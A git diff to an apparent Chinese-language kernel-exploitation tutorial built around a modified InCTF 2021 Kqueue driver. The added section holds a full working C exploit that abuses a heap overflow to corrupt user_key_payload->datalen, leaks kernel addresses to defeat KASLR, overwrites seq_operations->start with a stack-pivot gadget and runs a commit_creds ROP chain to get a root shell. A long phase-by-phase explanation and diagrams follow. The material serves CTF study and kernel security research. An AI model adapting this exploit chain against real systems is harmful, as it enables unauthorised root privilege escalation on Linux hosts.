@@ -18,9 +18,9 @@ mathjax: true
 
 **编译选项**：关闭`CONFIG_SLAB_FREELIST_HARDENED`、`CONFIG_MEMCG`、`CONFIG_HARDENED_USERCOPY`选项。开启`CONFIG_SLAB_FREELIST_RANDOM`、`CONFIG_SLUB`、`CONFIG_SLUB_DEBUG`、`CONFIG_BINFMT_MISC`、`CONFIG_E1000`、`CONFIG_E1000E`选项。完整配置参考[.config](https://github.com/BinRacer/pwn4kernel/blob/master/kernels/5.8.1/01/.config)。
 
-**保护机制**：SMEP/SMAP/KPTI
+**保护机制**：KASLR/SMEP/SMAP/KPTI
 
-**测试驱动程序**：本驱动程序基于**InCTF 2021 - Kqueue**题目修改而成。通过将存在漏洞的`memcpy`调用替换为`__copy_from_user`，并开启SMAP、SMEP与KPTI保护，构建了一个强化的内核漏洞利用测试环境。关键在于，虽然使用了`__copy_from_user`，但未对用户控制的拷贝长度进行校验，因此**堆溢出漏洞依然存在**。测试环境配置了`nokaslr`，故利用过程无需内核地址泄露步骤。本案例旨在研究在绕过上述现代防护机制（SMAP/SMEP/KPTI）的条件下，如何通过精确的堆布局操控与内核态ROP链构造，实现权限提升。
+**测试驱动程序**：本程序改编自**InCTF 2021 - Kqueue**赛题。核心修改在于将存在缺陷的`memcpy`调用替换为`__copy_from_user`函数，并同时开启SMAP、SMEP与KPTI防护，从而构建了一个强化后的内核漏洞利用测试平台。漏洞本质在于，虽然使用了`__copy_from_user`，但未能对用户态传入的拷贝长度进行有效校验，因此**经典的堆溢出漏洞依然可利用**。当前测试环境配置为`nokaslr`，故利用过程无需内核地址泄露环节。本研究旨在探究如何在绕过SMAP、SMEP及KPTI等现代防护机制的条件下，通过精确的堆风水操控与内核态ROP链构建，最终实现权限提升。自第五章起，将深入探讨在KASLR、SMEP、SMAP及KPTI完全开启的完整保护模式下，如何首先进行内核地址泄露，进而完成完整的利用链。
 
 驱动源码如下：
 
@@ -2062,7 +2062,619 @@ if (!getuid()) {
               height: auto;">
 </div>
 
+## 5. 进阶分析：user_key_payload结构利用
+
+exploit核心代码如下：
+
+```c
+/* Kernel symbol addresses */
+#define SINGLE_START 0xffffffff812112b0
+#define COMMIT_CREDS 0xffffffff8108e530
+#define PREPARE_KERNEL_CRED 0xffffffff8108e950
+#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00df0
+#define ADD_RSP_0XD0_POP_RBX_POP_RBP_RET 0xffffffff8126eb5f
+#define POP_RDI_RET 0xffffffff81001729
+#define POP_RCX_POP_RBX_POP_RBP_RET 0xffffffff811f2005
+#define MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET 0xffffffff81b2c10b
+
+/* Exploit configuration */
+#define KEY_SPRAY_COUNT 199
+#define SEQ_SPRAY_COUNT 512
+#define PAYLOAD_SIZE 0x2000
+#define DATA_INDEX_DATALEN 6
+#define DATA_INDEX_STACK_PIVOT 4
+#define KEY_PAYLOAD_DATA_SIZE (0x20 - 0x18)
+#define PROC_STAT_PATH "/proc/self/stat"
+
+/* Driver request structure */
+typedef struct {
+  uint32_t max_entries;
+  uint16_t data_size;
+  uint16_t entry_idx;
+  uint16_t queue_idx;
+  char *data;
+} request_t;
+
+/* Global variables */
+static int dev_fd;
+static int victim_fd;
+static int seq_fd[SEQ_SPRAY_COUNT];
+static int key_ids[KEY_SPRAY_COUNT];
+static size_t data[0x20] = {0};
+static char desc[0x100] = {0};
+static size_t *payload;
+
+/* ROP gadget addresses */
+static size_t commit_creds;
+static size_t prepare_kernel_cred;
+static size_t swapgs_restore_regs_and_return_to_usermode;
+static size_t add_rsp_0Xd0_pop_rbx_pop_rbp_ret;
+static size_t pop_rdi_ret;
+static size_t pop_rcx_pop_rbx_pop_rbp_ret;
+static size_t mov_rdi_rax_rep_movsq_rdi_rsi_ret;
+
+/* Device operation functions */
+static void create_queue(uint32_t max_entries, uint16_t data_size) {
+  request_t req = {.max_entries = max_entries, .data_size = data_size};
+  ioctl(dev_fd, 0xDEADC0DE, &req);
+}
+
+static void edit_queue(uint16_t queue_idx, uint16_t entry_idx, void *data) {
+  request_t req = {
+      .queue_idx = queue_idx, .entry_idx = entry_idx, .data = data};
+  ioctl(dev_fd, 0xDAADEEEE, &req);
+}
+
+static void delete_queue(uint16_t queue_idx) {
+  request_t req = {.queue_idx = queue_idx};
+  ioctl(dev_fd, 0xBADDCAFE, &req);
+}
+
+static void save_queue(uint16_t queue_idx, uint32_t max_entries,
+                       uint16_t data_size) {
+  request_t req = {.queue_idx = queue_idx,
+                   .max_entries = max_entries,
+                   .data_size = data_size};
+  ioctl(dev_fd, 0xB105BABE, &req);
+}
+
+/* Heap spraying functions */
+static int spray_seq_operations(int start_idx, int end_idx) {
+  for (int i = start_idx; i < end_idx; i++) {
+    seq_fd[i] = open(PROC_STAT_PATH, O_RDONLY);
+    if (seq_fd[i] < 0) {
+      log.error("Failed to open " PROC_STAT_PATH " at index %d", i);
+      return -1;
+    }
+  }
+  return 0;
+}
+
+static int spray_user_keys(int count) {
+  for (int i = 0; i < count; i++) {
+    snprintf(desc, sizeof(desc), "BinRacer%d", i);
+    key_ids[i] = key_alloc(desc, payload, KEY_PAYLOAD_DATA_SIZE);
+    if (key_ids[i] < 0) {
+      log.error("Failed to allocate key %d", i);
+      return -1;
+    }
+  }
+  return 0;
+}
+
+/* Kernel address leak function */
+static ssize_t leak_kernel_address(void) {
+  for (int i = 0; i < PAYLOAD_SIZE / sizeof(size_t); i++) {
+    if (payload[i] > kernel_base &&
+        (payload[i] & 0xfff) == (SINGLE_START & 0xfff)) {
+      log.success("Leaked single_start: 0x%lx", payload[i]);
+      return payload[i] - SINGLE_START;
+    }
+  }
+  return -1;
+}
+
+/* Exploit trigger function */
+static void trigger_exploit_chain(void) {
+  __asm__ volatile("mov r15,   pop_rdi_ret;"
+                   "mov r14,   0;"
+                   "mov r13,   prepare_kernel_cred;"
+                   "mov r12,   pop_rcx_pop_rbx_pop_rbp_ret;"
+                   "mov rbp,   0;"
+                   "mov rbx,   0x55555555;"
+                   "mov r11,   0x66666666;"
+                   "mov r10,   mov_rdi_rax_rep_movsq_rdi_rsi_ret;"
+                   "mov r9,    commit_creds;"
+                   "mov r8,    swapgs_restore_regs_and_return_to_usermode;"
+                   "xor rax,   rax;"
+                   "mov rcx,   0xaaaaaaaa;"
+                   "mov rdx,   8;"
+                   "lea rsi,   data;"
+                   "mov rdi,   victim_fd;"
+                   "syscall");
+}
+
+int main(void) {
+  /* Phase 1: Environment initialization */
+  log.info("Phase 1: Setting up exploit environment");
+  bind_core(0);
+  save_status();
+
+  memset(desc, 'A', sizeof(desc));
+  payload = (size_t *)malloc(PAYLOAD_SIZE);
+  if (!payload) {
+    log.error("Failed to allocate payload buffer");
+    exit(EXIT_FAILURE);
+  }
+  log.success("Payload buffer allocated at 0x%lx", (size_t)payload);
+
+  /* Phase 2: Open vulnerable device */
+  log.info("Phase 2: Opening vulnerable device /dev/kqueue");
+  dev_fd = open("/dev/kqueue", O_RDONLY);
+  if (dev_fd < 0) {
+    log.error("Failed to open /dev/kqueue");
+    exit(EXIT_FAILURE);
+  }
+
+  /* Phase 3: Prepare heap overflow data */
+  log.info("Phase 3: Constructing heap overflow data");
+  data[DATA_INDEX_DATALEN] =
+      PAYLOAD_SIZE; /* Target user_key_payload->datalen */
+  log.success("Set data[%d] = 0x%lx (target datalen)", DATA_INDEX_DATALEN,
+              data[DATA_INDEX_DATALEN]);
+
+  /* Phase 4: Create vulnerable kernel queue object */
+  log.info("Phase 4: Creating vulnerable kernel queue object");
+  create_queue(0xffffffff, 0x20 * 8);
+  edit_queue(0, 0, data);
+  log.success("Kernel queue created with overflow data prepared");
+
+  /* Phase 5: Spray user_key_payload objects */
+  log.info("Phase 5: Spraying user_key_payload objects");
+  if (spray_user_keys(KEY_SPRAY_COUNT) < 0) {
+    exit(EXIT_FAILURE);
+  }
+  log.success("Sprayed %d user_key_payload objects", KEY_SPRAY_COUNT);
+
+  /* Phase 6: Trigger heap overflow to corrupt user_key_payload */
+  log.info("Phase 6: Triggering heap overflow to corrupt user_key_payload");
+  save_queue(0, 0, 0x38);
+  log.success("Heap overflow triggered, user_key_payload->datalen corrupted");
+
+  /* Phase 7: Spray seq_operations objects */
+  log.info("Phase 7: Spraying seq_operations objects via " PROC_STAT_PATH);
+  if (spray_seq_operations(0, SEQ_SPRAY_COUNT) < 0) {
+    exit(EXIT_FAILURE);
+  }
+  log.success("Sprayed %d seq_operations objects", SEQ_SPRAY_COUNT);
+
+  /* Phase 8: Locate corrupted user_key_payload and leak kernel address */
+  log.info("Phase 8: Locating corrupted user_key_payload and leaking kernel "
+           "address");
+  int victim_key_idx = -1;
+  for (int i = 0; i < KEY_SPRAY_COUNT; i++) {
+    if (key_read(key_ids[i], payload, PAYLOAD_SIZE) > 8) {
+      victim_key_idx = i;
+      log.success("Found corrupted key at index %d", i);
+      break;
+    }
+  }
+  if (victim_key_idx == -1) {
+    log.error("Failed to locate corrupted user_key_payload");
+    exit(EXIT_FAILURE);
+  }
+
+  kernel_offset = leak_kernel_address();
+  if (kernel_offset == -1) {
+    log.error("Failed to leak kernel address");
+    exit(EXIT_FAILURE);
+  }
+  kernel_base += kernel_offset;
+  log.success("Kernel base: 0x%lx, offset: 0x%lx", kernel_base, kernel_offset);
+
+  /* Phase 9: Calculate ROP gadget addresses */
+  log.info("Phase 9: Calculating ROP gadget addresses");
+  prepare_kernel_cred = kernel_offset + PREPARE_KERNEL_CRED;
+  commit_creds = kernel_offset + COMMIT_CREDS;
+  swapgs_restore_regs_and_return_to_usermode =
+      kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x1e;
+  pop_rdi_ret = kernel_offset + POP_RDI_RET;
+  pop_rcx_pop_rbx_pop_rbp_ret = kernel_offset + POP_RCX_POP_RBX_POP_RBP_RET;
+  mov_rdi_rax_rep_movsq_rdi_rsi_ret =
+      kernel_offset + MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET;
+  add_rsp_0Xd0_pop_rbx_pop_rbp_ret =
+      kernel_offset + ADD_RSP_0XD0_POP_RBX_POP_RBP_RET;
+
+  /* Phase 10: Set up stack pivot gadget */
+  log.info("Phase 10: Setting up stack pivot gadget");
+  data[DATA_INDEX_STACK_PIVOT] = add_rsp_0Xd0_pop_rbx_pop_rbp_ret;
+  edit_queue(0, 0, data);
+  save_queue(0, 0, 0x28);
+  log.success("Stack pivot gadget placed at data[%d]", DATA_INDEX_STACK_PIVOT);
+
+  /* Phase 11: Trigger exploit chain via fork race */
+  log.info(
+      "Phase 11: Triggering corrupted seq_operations->start via fork race");
+  for (int i = 0; i < SEQ_SPRAY_COUNT; i++) {
+    victim_fd = seq_fd[i];
+    int pid = fork();
+    if (pid < 0) {
+      exit(EXIT_FAILURE);
+    }
+    if (pid == 0) {
+      trigger_exploit_chain();
+      if (getuid() == 0) {
+        get_root_shell();
+      }
+      exit(EXIT_SUCCESS);
+    }
+  }
+
+  /* Wait for child processes to complete */
+  while (wait(NULL) > 0)
+    ;
+  log.error("Exploit failed to obtain root privileges");
+  return EXIT_FAILURE;
+}
+```
+
+前述技术路径展示了通过堆溢出直接修改`seq_operations`的函数指针以实现控制流转移的直接方法。作为一种功能更为全面的替代方案，演示程序构建了一条从信息泄露到控制流转移的完整技术链。该链通过分阶段、有策略地运用同一堆溢出漏洞，先后影响`user_key_payload`和`seq_operations`两种关键结构体，实现了信息泄露与代码执行的组合操作。此路径的核心创新在于将单一的“写”漏洞转化为“先读后写”的复合能力，从而能够应对更严格的内核防护环境（如开启KASLR）。
+
+### 5-1. 技术链总览与流程图
+
+该技术链将操作过程清晰地划分为十一个逻辑阶段，其目标与操作环环相扣。整个过程体现了“准备-破坏-泄露-再准备-再破坏-执行”的递进式技术思想。下图展示了各阶段之间的逻辑关系、数据流向及核心目标：
+
+```mermaid
+graph TD
+    A["阶段1: 环境初始化<br>分配payload缓冲区"] --> B["阶段2: 打开漏洞设备<br>获取/dev/kqueue句柄"]
+    B --> C["阶段3: 准备堆溢出数据<br>设置datalen=0x2000"]
+    C --> D["阶段4: 创建异常队列对象<br>触发整数溢出，queue_size=32"]
+    D --> E["阶段5: 堆喷 user_key_payload<br>在kmalloc-32中布置目标结构 (199个)"]
+    E --> F["阶段6: 触发溢出污染datalen<br>通过save(…, 0x38)覆盖相邻key->datalen"]
+    F --> G["阶段7: 堆喷 seq_operations<br>布置第二阶段目标并填充内核指针 (512个)"]
+    G --> H["阶段8: 定位污染密钥并泄露内核地址<br>key_read越界读，解析single_start指针"]
+    H --> I["阶段9: 计算ROP gadget地址<br>基于泄露的基址计算所有gadget运行时地址"]
+    I --> J["阶段10: 二次溢出与栈迁移设置<br>save(…, 0x28)覆盖seq_ops->start为栈迁移gadget"]
+    J --> K["阶段11: 触发竞争执行ROP链<br>fork+read触发修改指针，执行commit(root cred)提权"]
+
+    style A fill:#f9f,stroke:#333
+    style H fill:#bbf,stroke:#333
+    style K fill:#bfb,stroke:#333
+
+    subgraph "第一阶段：制造信息泄露原语"
+        E --> F --> G --> H
+    end
+
+    subgraph "第二阶段：实现控制流转移"
+        I --> J --> K
+    end
+
+    H -- "计算出的内核镜像基址" --> I
+```
+
+### 5-2. 堆溢出操作的内存影响分析
+
+为了理解堆溢出操作的基本原理，首先分析在理想化线性布局下内存状态的变化。在Linux内核的`kmalloc-32`缓存中，内存按照32字节的块进行管理。考虑以下简化的连续内存布局场景：
+
+**溢出前内存布局（理想化线性模型）：**
+
+```
++----------------+ 0x00-0x1F: new_queue缓冲区 (32字节)
++----------------+ 0x20-0x3F: 目标结构体A (user_key_payload)
++----------------+ 0x40-0x5F: 目标结构体B (seq_operations)
+```
+
+**溢出操作：**
+当调用`__copy_from_user(new_queue, source, 40)`时，驱动程序试图从用户空间复制40字节数据到`new_queue`缓冲区。由于`new_queue`的大小仅为32字节，这导致了8字节的数据溢出：
+
+**溢出后内存布局（理想化模型）：**
+
+```
++----------------+ 0x00-0x1F: new_queue填充数据
++----------------+ 0x20-0x27: 结构体A前8字节被覆盖
++----------------+ 0x28-0x3F: 结构体A剩余24字节
++----------------+ 0x40-0x5F: 结构体B（未受影响）
+```
+
+在这个模型中，溢出数据精准地覆盖了相邻`user_key_payload`对象的头部。
+
+### 5-3. 真实环境下的堆布局复杂性
+
+然而，上述线性相邻模型是一种高度简化的理想情况。在实际的内核环境中，特别是在启用了`CONFIG_SLAB_FREELIST_RANDOM`等强化配置后，堆分配器的行为要复杂得多。`freelist`随机化机制会打乱内存块的分配顺序，使得目标结构体在物理内存上通常不是紧密相邻，而是可能被其他无关的内核对象间隔开。
+
+**真实环境下的可能内存布局：**
+
+```
++----------------+ 0x00-0x1F: new_queue缓冲区 (32字节)
++----------------+ 0x20-0x3F: 无关内核对象X
++----------------+ 0x40-0x5F: 目标结构体A (user_key_payload)
++----------------+ 0x60-0x7F: 无关内核对象Y
++----------------+ 0x80-0x9F: 目标结构体B (seq_operations)
++----------------+ 0xA0-0xBF: 其他对象...
+```
+
+在这种情况下，一次有限的堆溢出（例如8或24字节）可能无法直接触及预定目标。为了应对这种复杂性，演示程序采用了“堆喷”（Heap Spraying）策略，即批量分配大量目标结构体（如199个`user_key_payload`和512个`seq_operations`），从而显著提高至少一个目标结构体落入溢出范围内的统计概率。其核心关系可以表述为：
+
+$$
+[
+P_{\text{命中}} = 1 - (1 - p)^N
+]
+$$
+
+其中，$$(P_{\text{命中}})$$ 为至少命中一个目标的概率，$$(p)$$为单个目标对象与漏洞缓冲区相邻的概率，$$(N)$$ 为堆喷的数量。当 $$(N)$$ 足够大时，即使 $$(p)$$ 很小，$$(P_{\text{命中}})$$ 也能接近1。这种以数量换取确定性的方法是现代内核漏洞利用中应对随机化防护的常见策略。
+
+### 5-4. 密钥管理子系统的工作原理
+
+要理解`user_key_payload`结构的操作，需要先了解Linux密钥管理子系统的工作原理。`key_alloc`函数通过`add_key`系统调用创建新密钥，其内核调用流程如下：
+
+```mermaid
+graph TB
+    A[key_alloc用户调用] --> B[__x64_sys_add_key]
+    B --> C[__se_sys_add_key]
+    C --> D[__do_sys_add_key]
+
+    D --> E[description分配路径]
+    E --> F[key_create_or_update]
+    F --> G[key_alloc]
+    G --> H["kmemdup(desc, desclen + 1, GFP_KERNEL)"]
+
+    D --> I[payload分配路径]
+    I --> J[key_create_or_update]
+    J --> K[index_key.type->preparse]
+    K --> L[user_preparse]
+    L --> M["kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL)"]
+
+    style H fill:#e1f5fe
+    style M fill:#c8e6c9
+```
+
+`key_read`函数通过`keyctl`系统调用读取密钥负载，其内核调用流程如下：
+
+```mermaid
+graph TB
+    A[用户空间] --> B[__x64_sys_keyctl]
+    B --> C[keyctl_read_key]
+    C --> D["kmalloc(buflen, GFP_KERNEL)"]
+    D --> E[__keyctl_read_key]
+    E --> F["down_read(&key->sem)"]
+    F --> G[key_validate]
+    G --> H[key->type->read]
+    H --> I[user_read]
+    I --> J[user_key_payload_locked]
+    J --> K[计算实际读取长度]
+    K --> L["memcpy(key_data, upayload->data, buflen)"]
+    L --> M["up_read(&key->sem)"]
+    M --> N[返回user_read]
+    N --> O[返回key->type->read]
+    O --> P[返回__keyctl_read_key]
+    P --> Q[返回keyctl_read_key]
+    Q --> R["copy_to_user(user_buffer, key_data, ret)"]
+    R --> S["kfree(key_data)"]
+    S --> T[返回用户空间]
+
+    style D fill:#e1f5fe
+    style F fill:#e3f2fd
+    style G fill:#f3e5f5
+    style J fill:#e8f5e8
+    style L fill:#c8e6c9
+    style R fill:#d4edda
+```
+
+### 5-5. 完整利用阶段详解
+
+#### **阶段一：环境初始化与资源准备**
+
+程序首先进行精细化的执行环境配置。通过`bind_core(0)`系统调用将进程绑定到特定的CPU核心（通常为CPU 0）。这一操作旨在减少SMP（对称多处理）环境下多核并发操作对内核堆分配器行为造成的不可预测性，从而提升堆布局操作的确定性与成功率。随后，程序调用`save_status()`保存当前进程的运行时状态（如寄存器、打开的文件描述符等）。同时，程序分配一块大小为`PAYLOAD_SIZE`（0x2000字节）的连续用户空间缓冲区`payload`。该缓冲区在后续阶段将用于接收从被污染密钥中越界读取的大片内核堆数据，是信息泄露的存储与解析区域。
+
+#### **阶段二：建立与漏洞驱动的通信通道**
+
+通过`open("/dev/kqueue", O_RDONLY)`打开目标漏洞设备。获取到的文件描述符`dev_fd`是后续所有与驱动交互的`ioctl()`调用的句柄。此阶段验证了漏洞接口的可达性。
+
+#### **阶段三：构造用于污染`datalen`的溢出载荷**
+
+本阶段准备用于首次溢出的数据模板。程序定义了一个全局数组`data`，并将其`DATA_INDEX_DATALEN`索引处（根据上下文，通常为`data[6]`）的值设置为`PAYLOAD_SIZE`（0x2000）。这个值的设定具有明确目的：当此数据通过溢出覆盖相邻的`user_key_payload`结构时，旨在精准修改其`datalen`成员。`datalen`记录该密钥负载数据的有效长度。将其篡改为一个巨大的值（0x2000），将使内核在后继的`KEYCTL_READ`操作中误认为该密钥拥有极大的有效数据区，从而允许从该密钥起始地址开始，读取其后0x2000字节的内核内存，由此创造出强大的**越界读原语**。
+
+#### **阶段四：制造异常内存布局的队列对象**
+
+调用驱动的`CREATE_KQUEUE`命令（`ioctl(dev_fd, 0xDEADC0DE, &req)`），传入精心构造的参数：`max_entries = 0xFFFFFFFF`，`data_size = 0x100`。此处触发了驱动中的整数溢出漏洞：`max_entries + 1`由于32位无符号整数溢出，结果变为0。这导致驱动计算`queue_size = sizeof(queue) + (max_entries+1)*sizeof(entry)`时，后一项为零，最终`queue_size`被错误地计算为`sizeof(queue)`，即32字节。随后，程序通过`EDIT_KQUEUE`命令（`ioctl(dev_fd, 0xDAADEEEE, &req)`）将阶段三准备好的`data`数组写入此异常队列的`data`缓冲区。此时，内核中一个仅32字节大小的`queue`对象，其`data`指针指向一个用户控制的缓冲区。
+
+#### **阶段五：密集布局`user_key_payload`目标结构**
+
+程序调用`spray_user_keys(KEY_SPRAY_COUNT)`函数，通过循环执行`add_key()`系统调用来批量创建用户密钥。每个`add_key("BinRacer%d", payload, KEY_PAYLOAD_DATA_SIZE)`调用都会在内核的`kmalloc-32`缓存中分配一个`user_key_payload`结构体。通过大量（如199次）的密集分配，旨在“占据”`kmalloc-32`缓存中大部分空闲的`0x20`大小内存块（Slab）。其核心目的是利用堆分配器的分配特性，使得在阶段四创建的异常`queue`对象的`data`缓冲区在物理内存上，有极大概率与至少一个`user_key_payload`对象紧密相邻。这种“相邻”关系是后续溢出能够精准污染特定结构体的**物理基础**。
+
+#### **阶段六：触发首次溢出，篡改`datalen`制造读原语**
+
+这是实现信息泄露的关键一步。程序调用`SAVE_KQUEUE`命令（`ioctl(dev_fd, 0xB105BABE, &req)`），并指定`data_size = 0x38`（56字节）。驱动处理此请求时：
+
+1. 基于`queue->queue_size`（32字节）调用`kzalloc()`分配`new_queue`。
+2. 从用户空间`queue->data`向`new_queue`拷贝56字节。
+
+由于目标缓冲区仅32字节，这将导致**24字节的堆缓冲区溢出**。如果阶段五的堆布局成功，这溢出的24字节（其开头部分包含了预设的`PAYLOAD_SIZE`值）将覆盖相邻`user_key_payload`对象的头部。其中，关键的`datalen`字段被修改为`0x2000`。
+
+```mermaid
+graph LR
+    subgraph "溢出前内存布局 (kmalloc-32)"
+        A1["new_queue缓冲区<br>32字节"]
+        A2["user_key_payload<br>[rcu | datalen=小值 | data]"]
+        A3["其他内核对象"]
+    end
+
+    subgraph "溢出操作"
+        B["__copy_from_user<br>拷贝56字节到32字节缓冲区"]
+    end
+
+    subgraph "溢出后内存布局"
+        C1["new_queue缓冲区<br>填充数据"]
+        C2["user_key_payload<br>[rcu | datalen=0x2000 | data]"]
+        C3["其他内核对象"]
+    end
+
+    A1 --> B
+    A2 --> B
+    B --> C1
+    B --> C2
+
+    style A2 fill:#ffcccc
+    style C2 fill:#ccffcc
+```
+
+#### **阶段七：双重目的堆喷——注入指针与预备目标**
+
+程序调用`spray_seq_operations(SEQ_SPRAY_COUNT)`，通过反复`open("/proc/self/stat", O_RDONLY)`来批量分配`seq_operations`结构体。此阶段具有双重战略目的：
+
+1. **为信息泄露填充内容**：`seq_operations`结构体包含`single_start`等函数指针，这些指针指向内核文本段（`.text`）的固定偏移处。大量分配该结构体，可以使得当通过被污染的密钥执行越界读时，就极有可能读到这些包含内核指针的`seq_operations`对象，从而泄露内核基址。
+2. **为控制流转移布设靶标**：大量存在的`seq_operations`对象，为后续第二次溢出修改其`start`函数指针提供了丰富的潜在目标，显著提高了第二次操作的命中率。
+
+#### **阶段八：定位“毒钥”并计算内核基址**
+
+程序遍历所有之前分配的`key_ids`，对每一个调用`keyctl(KEYCTL_READ, key_id, payload, PAYLOAD_SIZE)`。对于`datalen`正常的密钥，此调用会失败或仅拷贝少量数据。而对于那个`datalen`被篡改为`0x2000`的“受害者密钥”，内核会忠实地从其对象起始地址开始，拷贝其后`0x2000`字节的内存内容到用户空间缓冲区`payload`中。
+
+随后，程序在`payload`缓冲区中线性搜索，寻找其值的低12位（页内偏移）与已知内核符号`single_start`的低12位相同的`size_t`值。由于内核代码段的页对齐特性，任何内核函数指针的页内偏移在KASLR启用时也是固定的。因此，一旦找到这样的值，即可通过公式`kernel_offset = leaked_address - SINGLE_START`计算出实际的KASLR偏移量。进而得到所有内核符号的运行时地址：`runtime_address = predefined_symbol_address + kernel_offset`。这标志着KASLR防护被完全绕过。
+
+#### **阶段九：动态构建ROP链——计算运行时地址**
+
+利用阶段八获得的`kernel_offset`，程序动态计算出后续利用所需的所有代码片段的实际内存地址。这包括：
+
+- **权限提升函数**：`prepare_kernel_cred`， `commit_creds`
+- **栈迁移指令**：`add_rsp_0xd0_pop_rbx_pop_rbp_ret`
+- **寄存器控制gadget**：`pop_rdi_ret`， `pop_rcx_pop_rbx_pop_rbp_ret`， `mov_rdi_rax_rep_movsq_rdi_rsi_ret`
+- **状态恢复与返回**：`swapgs_restore_regs_and_return_to_usermode`
+
+这些地址的计算确保了ROP链在不同KASLR随机化下的可用性。
+
+#### **阶段十：二次溢出——篡改控制流指针**
+
+在获得关键gadget地址后，程序将栈迁移gadget的地址赋值给`data[DATA_INDEX_STACK_PIVOT]`（例如`data[4]`），并通过`EDIT_KQUEUE`更新驱动内的`queue->data`。随后，**第二次**调用`SAVE_KQUEUE`，但此次指定`data_size = 0x28`（40字节）。内核再次分配一个32字节的`new_queue`。由于阶段七的密集堆喷，此次分配有很大概率与某个`seq_operations`对象相邻。
+
+紧接着的`__copy_from_user`执行40字节拷贝，导致**8字节溢出**。这溢出的8字节（即栈迁移gadget的地址）恰好覆盖了相邻`seq_operations`对象的`start`函数指针。
+
+```mermaid
+graph LR
+    subgraph "二次溢出前内存布局"
+        D1["new_queue缓冲区<br>32字节"]
+        D2["seq_operations<br>[start=0xffff... | next | show | stop]"]
+        D3["其他内核对象"]
+    end
+
+    subgraph "二次溢出操作"
+        E["__copy_from_user<br>拷贝40字节到32字节缓冲区"]
+    end
+
+    subgraph "二次溢出后内存布局"
+        F1["new_queue缓冲区<br>填充数据"]
+        F2["seq_operations<br>[start=栈迁移gadget | next | show | stop]"]
+        F3["其他内核对象"]
+    end
+
+    D1 --> E
+    D2 --> E
+    E --> F1
+    E --> F2
+
+    style D2 fill:#ffcccc
+    style F2 fill:#ccffcc
+```
+
+#### **阶段十一：触发竞争，执行权限提升链**
+
+程序通过`fork()`创建多个子进程，每个子进程尝试对阶段七中打开的某一个`seq_fd`执行`read()`系统调用。这是一个典型的**竞争触发**策略，旨在应对堆布局的不完全确定性。
+
+当某个子进程的`read()`调用进入内核，并最终通过`seq_operations->start`函数指针调用`single_start()`时，控制流会跳转到被篡改的地址，即栈迁移gadget。该gadget（`add rsp, 0xd0; pop rbx; pop rbp; ret`）将栈指针（RSP）增加`0xd0`字节。通过精心计算，这个操作使得RSP刚好指向内核栈上保存的系统调用入口现场——`pt_regs`结构中的某个特定寄存器位置。
+
+随后，通过连续的`ret`指令，程序开始执行预先通过内联汇编设置在`pt_regs`各寄存器值中的ROP链：首先将`0`传入`rdi`，调用`prepare_kernel_cred(0)`获得`root`凭证的指针并存入`rax`；接着通过`mov_rdi_rax`等gadget将凭证指针移至`rdi`，再调用`commit_creds(rdi)`将凭证应用于当前进程；最后，通过`swapgs_restore_regs_and_return_to_usermode` gadget执行`swapgs`指令、恢复用户态寄存器、并通过`iretq`指令返回用户态。此时，该子进程已获得`root`权限。父进程通过`wait()`回收子进程，若检测到有子进程提权成功，则整个技术链宣告完成。
+
+### 5-6. 堆布局与操作序列的时间线分析
+
+为了更好地理解整个操作过程中堆内存与系统状态的变化，可以从时间维度分析各个阶段的交互序列：
+
+```mermaid
+sequenceDiagram
+    participant User as 用户空间
+    participant KHeap as 内核堆(kmalloc-32)
+    participant KDriver as 漏洞驱动
+    participant KKey as 密钥子系统
+    participant KProc as 进程文件系统
+
+    Note over User,KProc: 阶段1-2: 环境初始化
+    User->>User: bind_core(0)<br>malloc(PAYLOAD_SIZE)
+    User->>KDriver: open("/dev/kqueue")
+
+    Note over User,KProc: 阶段3-4: 准备溢出载荷
+    User->>KDriver: CREATE_KQUEUE(0xffffffff, 0x100)
+    KDriver->>KHeap: kzalloc(32) // queue结构
+    User->>KDriver: EDIT_KQUEUE(data)
+
+    Note over User,KProc: 阶段5: 堆喷user_key_payload
+    loop 199次
+        User->>KKey: add_key("BinRacerX", ...)
+        KKey->>KHeap: kmalloc(sizeof(user_key_payload))<br>分配32字节
+    end
+
+    Note over User,KProc: 阶段6: 触发首次溢出
+    User->>KDriver: SAVE_KQUEUE(0, 0, 0x38)
+    KDriver->>KHeap: kzalloc(32) // new_queue
+    KDriver->>KHeap: 拷贝40字节(溢出8字节)
+    KHeap->>KKey: 污染user_key_payload->datalen
+
+    Note over User,KProc: 阶段7: 堆喷seq_operations
+    loop 512次
+        User->>KProc: open("/proc/self/stat")
+        KProc->>KHeap: kmalloc(sizeof(seq_operations))<br>分配32字节
+    end
+
+    Note over User,KProc: 阶段8: 信息泄露
+    loop 遍历所有密钥
+        User->>KKey: keyctl(KEYCTL_READ, key_id)
+        KKey->>KHeap: 检查datalen<br>拷贝数据
+        KHeap->>User: 返回堆数据(包含内核指针)
+    end
+
+    Note over User,KProc: 阶段9-10: 计算gadget并二次溢出
+    User->>User: 计算内核基址和gadget地址
+    User->>KDriver: EDIT_KQUEUE(更新数据)
+    User->>KDriver: SAVE_KQUEUE(0, 0, 0x28)
+    KDriver->>KHeap: kzalloc(32) // 另一个new_queue
+    KDriver->>KHeap: 拷贝40字节(溢出8字节)
+    KHeap->>KProc: 污染seq_operations->start指针
+
+    Note over User,KProc: 阶段11: 触发执行
+    User->>User: fork()创建子进程
+    User->>KProc: read(seq_fd, ...)
+    KProc->>KHeap: 调用被污染的start指针
+    KHeap->>KProc: 执行栈迁移gadget
+    KProc->>KProc: 执行ROP链<br>commit_creds(prepare_kernel_cred(0))
+    KProc->>User: 返回用户态(已是root)
+
+    User->>User: get_root_shell()
+```
+
+### 5-7. 技术路径对比
+
+| 特性维度       | `seq_operations` 直接路径     | `user_key_payload` 组合路径                              |
+| :------------- | :---------------------------- | :------------------------------------------------------- |
+| **核心目标**   | 直接转移控制流                | 先信息泄露，再转移控制流                                 |
+| **技术阶段**   | 单阶段：溢出后直接触发        | 双阶段：阶段1泄露地址，阶段2转移控制流                   |
+| **关键技术**   | 堆布局、ROP链构造             | 堆布局、越界读原语、地址计算、ROP链构造                  |
+| **对抗防护**   | 需预先知晓或绕过KASLR         | 可主动绕过KASLR                                          |
+| **结构体角色** | `seq_operations` 作为最终跳板 | `user_key_payload` 作为读原语；`seq_operations` 作为跳板 |
